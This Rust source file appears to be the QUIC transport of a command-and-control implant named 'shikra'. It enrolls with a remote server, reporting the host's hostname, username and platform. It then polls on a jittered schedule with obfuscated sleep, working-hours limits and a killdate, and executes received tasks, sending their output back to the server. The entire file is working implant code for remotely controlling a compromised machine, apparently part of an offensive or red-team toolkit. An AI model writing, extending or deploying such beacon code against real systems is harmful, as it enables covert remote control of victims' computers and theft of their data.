//! QUIC beacon client: enroll then poll on the profile schedule.
//!
//! Frame format matches `shikra_server::quic`:
//! `[u8 opcode][u32 le length][payload]`.

use crate::{execute_task, AgentState};
use anyhow::{Context, Result};
use prost::Message;
use quinn::{ClientConfig, Endpoint};
use shikra_crypto::channel::SessionKeys;
use shikra_crypto::kex::KeyPair;
use shikra_crypto::signing::{verify, Identity};
use shikra_proto::v1::{
    agent_message, AgentHeartbeat, AgentMessage, AgentResult, Architecture, CheckInRequest,
    CheckInResponse, Envelope, Platform, SessionKind,
};
use shikra_transport::profile::C2Profile;
use shikra_transport::wire;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;

const OP_ENROLL: u8 = 1;
const OP_POLL: u8 = 2;
const MAX_FRAME: usize = 8 * 1024 * 1024;

#[derive(Debug, Clone)]
pub struct QuicConfig {
    pub server_addr: String,
    pub server_name: String,
    pub ca_pem: String,
    pub server_identity: [u8; 32],
    pub enroll_token: String,
    pub profile: C2Profile,
    pub max_runtime_secs: Option<u64>,
}

fn client_endpoint(ca_pem: &str) -> Result<Endpoint> {
    let mut roots = rustls::RootCertStore::empty();
    for cert in rustls_pemfile::certs(&mut ca_pem.as_bytes()) {
        roots
            .add(cert.context("invalid CA certificate")?)
            .context("failed to add CA certificate")?;
    }
    let mut tls = rustls::ClientConfig::builder()
        .with_root_certificates(roots)
        .with_no_client_auth();
    tls.alpn_protocols = vec![b"shikra".to_vec()];
    let client_config = ClientConfig::new(Arc::new(
        quinn::crypto::rustls::QuicClientConfig::try_from(tls)?,
    ));
    let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
    endpoint.set_default_client_config(client_config);
    Ok(endpoint)
}

async fn exchange(
    send: &mut quinn::SendStream,
    recv: &mut quinn::RecvStream,
    opcode: u8,
    payload: &[u8],
) -> Result<Vec<u8>> {
    let mut frame = Vec::with_capacity(5 + payload.len());
    frame.push(opcode);
    frame.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    frame.extend_from_slice(payload);
    send.write_all(&frame).await.context("write frame")?;
    send.finish().context("finish stream")?;
    recv.read_to_end(MAX_FRAME).await.context("read response")
}

/// Runs the QUIC beacon loop.
pub async fn run_quic_beacon(config: QuicConfig) -> Result<()> {
    run_quic_beacon_notify(config, None).await
}

/// Like [`run_quic_beacon`], but signals `ready` after successful enrollment.
pub async fn run_quic_beacon_notify(
    config: QuicConfig,
    ready: Option<tokio::sync::oneshot::Sender<()>>,
) -> Result<()> {
    let endpoint = client_endpoint(&config.ca_pem)?;
    let connection = endpoint
        .connect(config.server_addr.parse()?, &config.server_name)
        .context("invalid QUIC server address")?
        .await
        .context("QUIC connection failed")?;

    let identity = Identity::generate();
    let kex = KeyPair::generate();
    let kex_public = kex.public_key();
    let signature = identity.sign(&wire::enroll_message(&kex_public));

    let checkin = CheckInRequest {
        identity_public: identity.public_key_bytes().to_vec(),
        kex_public: kex_public.to_vec(),
        identity_signature: signature.to_bytes().to_vec(),
        hostname: crate::hostname(),
        username: crate::username(),
        platform: current_platform(),
        architecture: current_architecture(),
        process_name: std::env::current_exe()
            .ok()
            .and_then(|path| path.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_default(),
        kind: SessionKind::Beacon as i32,
        enrollment_token: config.enroll_token.clone(),
        killdate_unix: crate::limits::get().killdate_unix,
        working_hours: crate::limits::get().working_hours.clone(),
    };

    let (mut send, mut recv) = connection.open_bi().await.context("open enroll stream")?;
    let body = exchange(&mut send, &mut recv, OP_ENROLL, &checkin.encode_to_vec()).await?;
    let checkin_response = CheckInResponse::decode(body.as_slice()).context("decode enroll")?;
    if checkin_response.session_id.starts_with("error:") {
        anyhow::bail!("enrollment rejected: {}", checkin_response.session_id);
    }

    let server_kex_public: [u8; 32] = checkin_response
        .server_kex_public
        .as_slice()
        .try_into()
        .map_err(|_| anyhow::anyhow!("server kex public key has wrong length"))?;
    verify(
        &config.server_identity,
        &wire::checkin_response_message(
            &checkin_response.session_id,
            &kex_public,
            &server_kex_public,
        ),
        &checkin_response.server_signature,
    )
    .context("server identity verification failed")?;

    let shared = kex.diffie_hellman(&server_kex_public);
    let keys = SessionKeys::derive(&checkin_response.session_id, &shared, true)
        .context("session key derivation failed")?;
    let keys = Arc::new(Mutex::new(keys));

    tracing::info!(
        session = %checkin_response.session_id,
        transport = "quic",
        "beacon checked in"
    );
    if let Some(ready) = ready {
        let _ = ready.send(());
    }

    let mut agent_state = AgentState::default();
    let mut pending_results = crate::MaskedResults::new();
    let deadline = config
        .max_runtime_secs
        .map(|secs| tokio::time::Instant::now() + Duration::from_secs(secs));

    loop {
        if crate::limits::killdate_expired() {
            tracing::info!("killdate reached; exiting");
            std::process::exit(0);
        }
        if crate::limits::outside_working_hours() {
            tokio::time::sleep(Duration::from_secs(60)).await;
            continue;
        }
        if let Some(deadline) = deadline {
            if tokio::time::Instant::now() >= deadline {
                break;
            }
        }

        let message = match pending_results.take_batch() {
            Some(batch) => AgentMessage {
                body: Some(agent_message::Body::Results(batch)),
            },
            None => AgentMessage {
                body: Some(agent_message::Body::Heartbeat(AgentHeartbeat {
                    unix_ms: crate::current_unix_ms(),
                })),
            },
        };

        let envelope = {
            let mut keys = keys.lock().await;
            wire::seal_message(&mut keys, &message).context("seal poll")?
        };

        match connection.open_bi().await {
            Ok((mut send, mut recv)) => {
                let payload = envelope.encode_to_vec();
                match exchange(&mut send, &mut recv, OP_POLL, &payload).await {
                    Ok(body) => {
                        if let Ok(reply) = Envelope::decode(body.as_slice()) {
                            let opened = {
                                let mut keys = keys.lock().await;
                                wire::open_message(&mut keys, &reply).ok()
                            };
                            if let Some(opened) = opened {
                                if let Some(agent_message::Body::Tasks(batch)) = opened.body {
                                    for task in batch.tasks {
                                        let task_id = task.task_id.clone();
                                        let outcome =
                                            execute_task(&mut agent_state, &task, None).await;
                                        pending_results.push(AgentResult {
                                            task_id,
                                            exit_code: outcome.exit_code,
                                            stdout: outcome.stdout,
                                            stderr: outcome.stderr.into_bytes(),
                                        });
                                    }
                                }
                            }
                        }
                    }
                    Err(err) => tracing::warn!(%err, "QUIC poll failed"),
                }
            }
            Err(err) => tracing::warn!(%err, "QUIC stream open failed"),
        }

        let jitter = if config.profile.jitter_secs > 0 {
            rand::random::<u64>() % config.profile.jitter_secs
        } else {
            0
        };
        crate::sleep_obfuscated(Duration::from_secs(
            config.profile.poll_interval_secs.max(1) + jitter,
        ))
        .await;
    }

    connection.close(0u32.into(), b"bye");
    Ok(())
}

fn current_platform() -> i32 {
    if cfg!(target_os = "windows") {
        Platform::Windows as i32
    } else if cfg!(target_os = "macos") {
        Platform::Macos as i32
    } else {
        Platform::Linux as i32
    }
}

fn current_architecture() -> i32 {
    if cfg!(target_arch = "aarch64") {
        Architecture::Aarch64 as i32
    } else {
        Architecture::X8664 as i32
    }
}
